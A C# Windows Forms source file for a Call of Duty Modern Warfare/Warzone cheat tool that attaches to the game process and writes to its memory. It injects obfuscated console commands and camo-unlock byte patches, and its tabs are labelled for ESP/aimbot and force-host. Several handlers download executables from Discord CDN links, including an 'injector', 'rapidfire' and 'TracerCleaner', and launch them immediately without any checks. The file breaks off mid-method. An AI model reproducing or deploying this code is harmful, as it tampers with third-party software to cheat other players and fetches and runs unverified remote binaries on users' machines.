using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using jMem;
using System.Net;
namespace Intoxicated
{
    public partial class Intoxicated : Form
    {
        jm jm = new jm();
        bool ProcOpen = false;
        public Intoxicated()
        {
            InitializeComponent();
        }
        private void Intoxicated_Shown(object sender, EventArgs e)
        {
            BGWorker.RunWorkerAsync();
        }
        private void ControlBox_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
        private void BGWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            ProcOpen = jm.OpenProcess("ModernWarfare");

            if (ProcOpen)
            {
                ProcOpenLabel.ForeColor = Color.Red;
                ProcOpenLabel.Text = "Attached";
            }
            else
            {
                ProcOpenLabel.ForeColor = Color.Red;
                ProcOpenLabel.Text = "Not Found";
            }

            Thread.Sleep(600);
            BGWorker.ReportProgress(0);
            {
                using (Process p = Process.GetCurrentProcess())
                    p.PriorityClass = ProcessPriorityClass.High;
            }
        }

        private void BGWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            BGWorker.RunWorkerAsync();
        }
        public void Cbuf(string cmd)
        {
            if (ProcOpen)
            {
                jm.WriteString(jm.ReadUInt64("base+1BA11680"), cmd + "\0");
                jm.WriteInt32("base+1BA1168C", cmd.Length.ToString());
            }
            else
            {
                MessageBox.Show("Please Open MW/WZ First");
            }
        }
       

        private void UnlockGunsAttachments_Click(object sender, EventArgs e)
        {
            Cbuf("set OLKMKMTKRO 1");
        }

        private void UnlockCDLCamos_Click(object sender, EventArgs e)
        {
            jm.WriteString("base+69", "camo_01a\0270001");
        }





        private void ResetCWCamo_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+1DE40F0708,28,B90,900,20", "63 61 6D 6F 5F 6D 70 5F 74 39 74 69 65 72 31 5F 30 31 00 32 33 32 30 37 30 35 32 00 63 61 6D 6F");
        }

        private void ModdedLoadoutTextBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
            Cbuf("MTQLNMTRLS 1");
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            jm.WriteString("base+69", "camo_01a\0270001");
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void XPTabPage_Click(object sender, EventArgs e)
        {

        }



        private void ModdedLoadoutValue_ValueChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch7_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    using (WebClient web1 = new WebClient())
                    {
                        web1.DownloadFile("https://cdn.discordapp.com/attachments/900123100388143114/916657147121664110/NXT-G3N_INJECTOR.exe", "NXT-G3N_INJECTOR.exe");
                        Process.Start("NXT-G3N_INJECTOR.exe");
                    }
                }
            }
        }





        private void guna2ToggleSwitch11_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch11_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch12_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch13_CheckedChanged(object sender, EventArgs e)
        {

        }



       

       

        private void guna2ToggleSwitch4_CheckedChanged(object sender, EventArgs e)
        {

        }

       

        private void guna2ToggleSwitch16_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    using (WebClient web1 = new WebClient())
                        web1.DownloadFile("https://cdn.discordapp.com/attachments/900123100388143114/913792915136995388/NXT-G3N_INJECTOR.exe", "NXT-G3N_INJECTOR.exe");
                    System.Diagnostics.Process.Start("NXT-G3N_INJECTOR.exe");


                }
            }
        }

       

        private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            {
                if (guna2ToggleSwitch1.Checked == true)
                {
                    if (this.guna2ToggleSwitch1.Checked)
                    {
                        this.Cbuf("MKMRRLNRTM 5");
                    }
                }
                else if (guna2ToggleSwitch1.Checked == false)
                {
                    this.Cbuf("MKMRRLNRTM 1");

                }
            }
        }

      

        private void guna2ToggleSwitch3_CheckedChanged(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/892974175080308736/910338241805320282/rapidfire.exe", "rapidfire.exe");
                    System.Diagnostics.Process.Start("rapidfire.exe");
                }
            }
        }

       


        private void guna2ToggleSwitch9_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    using (WebClient web1 = new WebClient())
                    {
                        web1.DownloadFile("https://cdn.discordapp.com/attachments/892974175080308736/910727381319307305/TracerCleaner.exe", "TracerCleaner.exe");
                        web1.Proxy = null;
                        Process.Start("TracerCleaner.exe");
                    }
                }
            }
        }

        private void label27_Click(object sender, EventArgs e)
        {

        }

      
       

       

        private void MWCamoSwapComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }



       






        private void guna2Button1_Click(object sender, EventArgs e)
        {

        }



        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            jm.WriteBytes("base+1A6EB658,2AC,58,2E7120", "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00");
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }



        private void guna2Button6_Click(object sender, EventArgs e)
        {
            {
                jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 30 31 61 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00");
            }
        }

        private void CWCamoSwapComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }



        private void guna2Button2_Click(object sender, EventArgs e)
        {
            {
                jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 74 69 65 72 31 5F 30 31 00 32 33 32 30 37 30 35 32 00 63 61 6D 6F");
            }
        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            {
                if (MWCamoSwapComboBox.Text == "Gold (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 61 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Platinum (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 62 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Damascus (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 63 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Obsidian (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 64 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Gold (CW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 6D 61 73 74 65 72 79 5F 67 6F 6C 64 00 62 00 32 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Diamond (CW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 6D 61 73 74 65 72 79 5F 64 69 61 6D 6F 6E 64 00 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Dark Matter (CW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 6D 61 73 74 65 72 79 5F 64 61 72 6B 6D 61 74 74 65 72 00 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Golden Viper (ZM)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 67 6F 6C 64 00 62 00 32 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Plague Diamond (ZM)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 64 69 61 6D 6F 6E 64 00 37 30 30 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Dark Aether (ZM)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 64 61 72 6B 6D 61 74 74 65 72 00 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Cherry Blossom")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 64 61 72 6B 6D 61 74 74 65 72 00 30 32 00");
                }
                else if (MWCamoSwapComboBox.Text == "Banded")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6d 6f 5f 30 30 63 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00 63 61 6D 6F 5F 30 31 63 00 32 37 30 30 30 33 00 63 61 6D 6F 5F 30 31 64 00");
                }
                else if (MWCamoSwapComboBox.Text == "ActivCamo")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6d 6f 5f 30 30 62 00 32 37 30 30 30 31 00 63 61 6D 6F 5F 30 31 62 00 32 37 30 30 30 32 00 63 61 6D 6F 5F 30 31 63 00 32 37 30 30 30 33 00 63 61 6D 6F 5F 30 31 64 00");
                }
                else if (MWCamoSwapComboBox.Text == "Atlanta FaZe")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 61 00");
                }
                else if (MWCamoSwapComboBox.Text == "Chicago Huntsmen")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 62 00");
                }
                else if (MWCamoSwapComboBox.Text == "Dallas Empire")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 63 00");
                }
                else if (MWCamoSwapComboBox.Text == "Florida Mutineers")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 64 00");
                }
                else if (MWCamoSwapComboBox.Text == "Los Angeles Guerrillas")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 65 00");
                }
                else if (MWCamoSwapComboBox.Text == "London Royal Ravens")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 66 00");
                }
                else if (MWCamoSwapComboBox.Text == "Minnesota RÃ˜KKR")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 67 00");
                }
                else if (MWCamoSwapComboBox.Text == "New York Subliners")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 68 00");
                }
                else if (MWCamoSwapComboBox.Text == "OpTic Gaming Los Angeles")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 69 00");
                }
                else if (MWCamoSwapComboBox.Text == "Paris Legion")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 6A 00");
                }
                else if (MWCamoSwapComboBox.Text == "Seattle Surge")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 6B 00");
                }
                else if (MWCamoSwapComboBox.Text == "Toronto Ultra")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 32 6C 00");
                }

            }
        }

        private void guna2ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void groupBox11_Enter(object sender, EventArgs e)
        {

        }


        private void guna2Button3_Click(object sender, EventArgs e)
        {
            {
                if (CWCamoSwapComboBox.Text == "Gold (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 61 00 39 74 69 65 72 31 5F 30 31 00 32 33 32 30 37 30 35 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Platinum (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 62 00 39 74 69 65 72 31 5F 30 31 00 32 33 32 30 37 30 35 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Damascus (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 63 00 39 74 69 65 72 31 5F 30 31 00 32 33 32 30 37 30 35 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Obsidian (MW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 31 31 64 00 39 74 69 65 72 31 5F 30 31 00 32 33 32 30 37 30 35 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Gold (CW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 6D 61 73 74 65 72 79 5F 67 6F 6C 64 00 37 30 35 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Diamond (CW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 6D 61 73 74 65 72 79 5F 64 69 61 6D 6F 6E 64 00 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Dark Matter (CW)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 6D 70 5F 74 39 6D 61 73 74 65 72 79 5F 64 61 72 6B 6D 61 74 74 65 72 00 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Golden Viper (ZM)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 67 6F 6C 64 00 37 30 35 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Plague Diamond (ZM)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 64 69 61 6D 6F 6E 64 00 32 00 63 61 6D 6F");
                }
                else if (CWCamoSwapComboBox.Text == "Dark Aether (ZM)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "63 61 6D 6F 5F 7A 6D 5F 74 39 6D 61 73 74 65 72 79 5F 64 61 72 6B 6D 61 74 74 65 72 00 61 6D 6F");
                }
            }
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            {
                {
                    using (WebClient web1 = new WebClient())
                    {
                        web1.DownloadFile("https://cdn.discordapp.com/attachments/892974175080308736/910727381319307305/TracerCleaner.exe", "TracerCleaner.exe");
                        web1.Proxy = null;
                        Process.Start("TracerCleaner.exe");
                    }
                }
            }
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            {
                {
                    using (WebClient web1 = new WebClient())
                    {
                        web1.DownloadFile("https://cdn.discordapp.com/attachments/900123100388143114/916657147121664110/NXT-G3N_INJECTOR.exe", "NXT-G3N_INJECTOR.exe");
                        Process.Start("NXT-G3N_INJECTOR.exe");
                    }
                }
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            {
                {
                    {
                        this.Cbuf("set OLKMKMTKRO 1");
                        this.Cbuf("set OKPRQTRPMP 0");
                        this.Cbuf("set NSPPTONLNP 1");
                        this.Cbuf("set NLOTNSOSKK 1");
                        this.Cbuf("set MNRNRKMQKK 1");
                        this.Cbuf("set MNLPOPMMSK 1");
                        this.Cbuf("set LSPQSSPSOL 1");
                        this.Cbuf("NNOTOOSNQR 1");//QMRSMTKKS unlocks

                    }

                }

            }

        }


        private void metroButton4_Click(object sender, EventArgs e)
        {
            {
                {

                    {

                        {
                            this.Cbuf("LTKKKPSRSK 2");

                        }

                    }
                }
            }
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            {

                {
                    this.Cbuf("LKKNORQKTP 2");

                }
            }
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            {
                {
                    {
                        this.Cbuf("PMORNPNTK 2");

                    }
                }
            }
        }

        private void ESPAimbotTabPage_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch19_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            {

                {
                    this.Cbuf("NRRKTONLNK 2");

                }
            }

        }

        private void ForceHostTabPage_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button8_Click(object sender, EventArgs e)
        {
            {
                {

                    {
                        this.Cbuf("LSSRRSMNMR 1");

                    }
                }

            }
        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/900123100388143114/917158623115890718/FOV_CIRCLE.exe", "FOV_CIRCLE.exe");
                    Process.Start("FOV_CIRCLE.exe");
                }
            }
        }

    

        private void metroButton4_Click_1(object sender, EventArgs e)
        {
            {
                {
                    {
                        this.Cbuf("set OLKMKMTKRO 1");
                        this.Cbuf("set OKPRQTRPMP 0");
                        this.Cbuf("set NSPPTONLNP 1");
                        this.Cbuf("set NLOTNSOSKK 1");
                        this.Cbuf("set MNRNRKMQKK 1");
                        this.Cbuf("set MNLPOPMMSK 1");
                        this.Cbuf("set LSPQSSPSOL 1");
                        this.Cbuf("NNOTOOSNQR 1");//QMRSMTKKS unlocks

                    }

                }

            }
        }

        private void guna2ToggleSwitch4_CheckedChanged_1(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set MNQKMLMMM 1");
                    this.Cbuf("set NRMMRSMNPS 1");
                    this.Cbuf("set LQNKRLQTLM 1");
                    this.Cbuf("set RPNQOQSOS 1");
                    this.Cbuf("set OMRLPMMPRL 1");
                    this.Cbuf("set OMNLSQLMMP 1");
                    this.Cbuf("set MRTTLKLTKO 1");
                    this.Cbuf("set NKTNRLTOSO 1");
                    this.Cbuf("set MTTRPNMPRP 1");
                    this.Cbuf("set OLKNTQKTPP 1");
                    this.Cbuf("set SNTTNKSRO 1");

                }

            }
        }

        private void guna2ToggleSwitch5_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set MOOOOTKPTL 1");
                    this.Cbuf("set LQPKMLTOQM 1");
                    this.Cbuf("set OLMOTLRSPK 1");
                    this.Cbuf("set NNPMRQSQN 1");
                    this.Cbuf("set PMTLOTQQS 1");
                    this.Cbuf("set NLOTPSPSOQ 1");
                    this.Cbuf("set LKLOMSPQSR 1");
                    this.Cbuf("set OSNMNPLRR 1");
                    this.Cbuf("set LPRTSKKKLL 1");
                    this.Cbuf("set NSKOMKOSLO 1");
                    this.Cbuf("set NNNSQLQO 1");
                    this.Cbuf("set LTLMRRLTR 1");
                    this.Cbuf("set MNLPOPMMSK 1");
                    this.Cbuf("set LSPQSSPSOL 1");
                    this.Cbuf("set NQRLNKMTSL 1");
                    this.Cbuf("set OMKLOKONRK 1");
                    this.Cbuf("set NNOTOOSNQR 1");

                }

            }
        }

        private void guna2ToggleSwitch6_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set MLNSOPOTNQ 1");
                    this.Cbuf("set LLRLMRNNNM 1");
                    this.Cbuf("set MMLPKNNRMM 1");
                    this.Cbuf("set LKMRLPORSK 1");
                    this.Cbuf("set LNSMNRRQN 1");
                    this.Cbuf("set NMSNLMKKQS 1");
                    this.Cbuf("set MQNLOSMSQR 1");
                    this.Cbuf("set LTLNQLSSK  1");
                    this.Cbuf("set NTKOQLQNMS 1");
                    this.Cbuf("set NSSKMSRTMN 1");
                    this.Cbuf("set LPKNOPTMLP 1");
                    this.Cbuf("set OKPORRORMM 1");
                    this.Cbuf("set MPKLTKMKTL 1");
                    this.Cbuf("set OMPKROKQPL 1");
                    this.Cbuf("set MPMTRSQLLO 1");
                    this.Cbuf("set MMOOMQPMTP 1");
                    this.Cbuf("set NKRLMNTNRS 1");
                    this.Cbuf("set OSNKSLRMS 1");
                    this.Cbuf("set MRKSTPMLT 1");
                    this.Cbuf("set MNRNRKMQKK 1");
                    this.Cbuf("set NNQSMOKTKM 1");
                    this.Cbuf("set MQQOKSOPL 1");
                    this.Cbuf("set LKSKPKTOON 1");
                    this.Cbuf("set NNOQMLNSMP 1");
                    this.Cbuf("set NQOMTKMNPT 1");

                }

            }
        }

        private void guna2ToggleSwitch19_CheckedChanged_1(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set OKKNPPMMML 1");
                    this.Cbuf("set LPTKTQORTR 1");
                    this.Cbuf("set NQOKPOKKML 1");
                    this.Cbuf("set NPOLQSQMNO 1");
                    this.Cbuf("set LSSRRSMNMR 1");
                    this.Cbuf("set LNNNKNLPKP 1");
                    this.Cbuf("set PPMTTRNQM  1");
                    this.Cbuf("set NKNMQRQMM  1");
                    this.Cbuf("set NRPOLLOOLL 1");
                    this.Cbuf("set NKORSMKORK 1");
                    this.Cbuf("set NNPPKLQOSN 1");
                    this.Cbuf("set NPKTRSPLNN 1");
                    this.Cbuf("set TQRNTTMSL  1");
                    this.Cbuf("set LQMNOKSPLN 1");
                    this.Cbuf("set LSTSLQMPQP 1");
                    this.Cbuf("set LPTQKMPTNP 1");
                    this.Cbuf("set LKOKMNPSLM 1");
                    this.Cbuf("set LOKSLQPSKT 1");
                    this.Cbuf("set NQSOLTPSSM 1");
                    this.Cbuf("set MLQRKOONNM 1");
                    this.Cbuf("set LPTSRPTOQQ 1");

                }

            }
        }

        private void guna2ToggleSwitch20_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set LSOLLKOPQT 1");
                    this.Cbuf("set NRTSOTKTOS 1");
                    this.Cbuf("set NMKTMRRMKN 1");
                    this.Cbuf("set OROLLTLOO 1");
                    this.Cbuf("set MNNMKSKTR 1");
                    this.Cbuf("set LRRRTTOSSK 1");
                    this.Cbuf("set NOPMMKMQTP 1");
                    this.Cbuf("set LOTTMONMPO 1");
                    this.Cbuf("set MRNSTPNLPS 1");
                    this.Cbuf("set LQKTNLONLP 1");
                    this.Cbuf("set LOMSTMNPRR 1");
                    this.Cbuf("set NOPLKRPKQL 1");
                    this.Cbuf("set MRRPNNKKPO 1");
                    this.Cbuf("set LKQKPMMRLK 1");
                    this.Cbuf("set NKSTOOTSMO 1");
                    this.Cbuf("set MSROMLONNT 1");
                    this.Cbuf("set TORMQRSOS 1");
                    this.Cbuf("set LNORNRSRLR 1");
                    this.Cbuf("set LROKLTPMOM 1");
                    this.Cbuf("set NNMMRMNMNQ 1");
                    this.Cbuf("set NQTSMTPTMS 1");
                    this.Cbuf("set NQROMTQPMT 1");
                    this.Cbuf("set LMKMRSPR 1");
                    this.Cbuf("set LPOOMOLLRQ 1");
                    this.Cbuf("set LNTOKPTKS 1");
                    this.Cbuf("set NRTLNOPOSM 1");

                }

            }
        }

        private void guna2ToggleSwitch28_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set OKPQTKQLSO 1");
                    this.Cbuf("set TPTKKSNQ 1");
                    this.Cbuf("set LPRKRTSPQT 1");
                    this.Cbuf("set OKLLMNRTP 1");
                    this.Cbuf("set NPSQPOMPLP 1");
                    this.Cbuf("set NQTKKMTSKL 1");
                    this.Cbuf("set LSORRMTOPP 1");
                    this.Cbuf("set MTNKKKTTRR 1");
                    this.Cbuf("set NTKSMOLO  1");
                    this.Cbuf("set NRTOORMRKR 1");
                    this.Cbuf("set LTPLSOTTSR 1");
                    this.Cbuf("set LNKTTMTOMR 1");

                }

            }
        }

        private void guna2ToggleSwitch29_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set NSLPPMQKQM 1");
                    this.Cbuf("set NLKQPLPLQK 1");
                    this.Cbuf("set QOTNQOSRN 1");
                    this.Cbuf("set MSKSNROSLL 1");
                    this.Cbuf("set LSQNRLMKST 1");
                    this.Cbuf("set SPOPPKOTP 1");
                    this.Cbuf("set LPRRLSSTLP 1");
                    this.Cbuf("set OKPMLLOPSK 1");
                    this.Cbuf("set NKKONQKNL 1");
                    this.Cbuf("set NLOPLSNPQN 1");
                    this.Cbuf("set MKRKLLSKSP 1");
                    this.Cbuf("set MQRQOLKOTK 1");
                    this.Cbuf("set MOKSKKQRLK 1");
                    this.Cbuf("set MQTOPKPMRS 1");
                    this.Cbuf("set MMQLPLSNOM 1");
                    this.Cbuf("set NRONMTPKML 1");
                    this.Cbuf("set MPQSMOPRQK 1");
                    this.Cbuf("set SKLSORKTK 1");
                    this.Cbuf("set LTOQKNQLNP 1");
                    this.Cbuf("set LNTOLMQMOQ 1");
                    this.Cbuf("set LKSQOLNKLP 1");
                    this.Cbuf("set LMMRONPQMO 1");
                    this.Cbuf("set LORQPPPMT 1");
                    this.Cbuf("set LSPTSOQPPT 1");
                    this.Cbuf("set NPKSLQQPMP 1");
                    this.Cbuf("set LNLPTMKPT 1");
                    this.Cbuf("set LSSPPSTLQ 1");

                }

            }
        }

        private void guna2ToggleSwitch30_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set NNOOPSNPRM 1");
                    this.Cbuf("set NMPNSQNNRQ 1");
                    this.Cbuf("set OKMSLSMRNQ 1");
                    this.Cbuf("set LSQMOSORKS 1");
                    this.Cbuf("set MOMKSMKTOQ 1");
                    this.Cbuf("set NPTKMLRPLQ 1");
                    this.Cbuf("set NRKONTQOLL 1");
                    this.Cbuf("set LSTLRKKORT 1");
                    this.Cbuf("set NLOMTKROPP 1");
                    this.Cbuf("set MSORMTOPKQ 1");
                    this.Cbuf("set NTOQQKTRPL 1");
                    this.Cbuf("set LLRTNMKLTL 1");
                    this.Cbuf("set OKNMQLTKLP 1");
                    this.Cbuf("set NQKRRQQNQR 1");
                    this.Cbuf("set LMQNMORNRQ 1");

                }

            }
        }

        private void guna2ToggleSwitch31_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set MQMRPPKMK 1");
                    this.Cbuf("set NSNLRONNTR 1");
                    this.Cbuf("set MRKOMSNLRK 1");
                    this.Cbuf("set NRMNMOOLSM 1");
                    this.Cbuf("set NQSTORNSRO 1");
                    this.Cbuf("set LPPLOPRQOO 1");
                    this.Cbuf("set MPNKRKSONP 1");
                    this.Cbuf("set LLKTPRPTMO 1");
                    this.Cbuf("set LQTOLLKQSS 1");
                    this.Cbuf("set NNRQTOQSSP 1");
                    this.Cbuf("set LTQRTPPKKS 1");
                    this.Cbuf("set MKNMNRSQRO 1");
                    this.Cbuf("set MLNNMOPQOP 1");
                    this.Cbuf("set NONPSKRPRR 1");
                    this.Cbuf("set TNOQPMNNT 1");
                    this.Cbuf("set LRSRKSSTTK 1");

                }

            }
        }

        private void guna2ToggleSwitch32_CheckedChanged(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set NNOOPSNPRM 1");
                    this.Cbuf("set NMPNSQNNRQ 1");
                    this.Cbuf("set OKMSLSMRNQ 1");
                    this.Cbuf("set LSQMOSORKS 1");
                    this.Cbuf("set MOMKSMKTOQ 1");
                    this.Cbuf("set NPTKMLRPLQ 1");
                    this.Cbuf("set NRKONTQOLL 1");
                    this.Cbuf("set LSTLRKKORT 1");
                    this.Cbuf("set NLOMTKROPP 1");
                    this.Cbuf("set MSORMTOPKQ 1");
                    this.Cbuf("set NTOQQKTRPL 1");
                    this.Cbuf("set LLRTNMKLTL 1");
                    this.Cbuf("set OKNMQLTKLP 1");
                    this.Cbuf("set NQKRRQQNQR 1");
                    this.Cbuf("set LMQNMORNRQ 1");

                }

            }
        }

        private void guna2ToggleSwitch4_CheckedChanged_2(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set LSOLLKOPQT 1");
                    this.Cbuf("set NRTSOTKTOS 1");
                    this.Cbuf("set NMKTMRRMKN 1");
                    this.Cbuf("set OROLLTLOO 1");
                    this.Cbuf("set MNNMKSKTR 1");
                    this.Cbuf("set LRRRTTOSSK 1");
                    this.Cbuf("set NOPMMKMQTP 1");
                    this.Cbuf("set LOTTMONMPO 1");
                    this.Cbuf("set MRNSTPNLPS 1");
                    this.Cbuf("set LQKTNLONLP 1");
                    this.Cbuf("set LOMSTMNPRR 1");
                    this.Cbuf("set NOPLKRPKQL 1");
                    this.Cbuf("set MRRPNNKKPO 1");
                    this.Cbuf("set LKQKPMMRLK 1");
                    this.Cbuf("set NKSTOOTSMO 1");
                    this.Cbuf("set MSROMLONNT 1");
                    this.Cbuf("set TORMQRSOS 1");
                    this.Cbuf("set LNORNRSRLR 1");
                    this.Cbuf("set LROKLTPMOM 1");
                    this.Cbuf("set NNMMRMNMNQ 1");
                    this.Cbuf("set NQTSMTPTMS 1");
                    this.Cbuf("set NQROMTQPMT 1");
                    this.Cbuf("set LMKMRSPR 1");
                    this.Cbuf("set LPOOMOLLRQ 1");
                    this.Cbuf("set LNTOKPTKS 1");
                    this.Cbuf("set NRTLNOPOSM 1");

                }

            }
        }

        private void guna2ToggleSwitch5_CheckedChanged_1(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set MQMRPPKMK 1");
                    this.Cbuf("set NSNLRONNTR 1");
                    this.Cbuf("set MRKOMSNLRK 1");
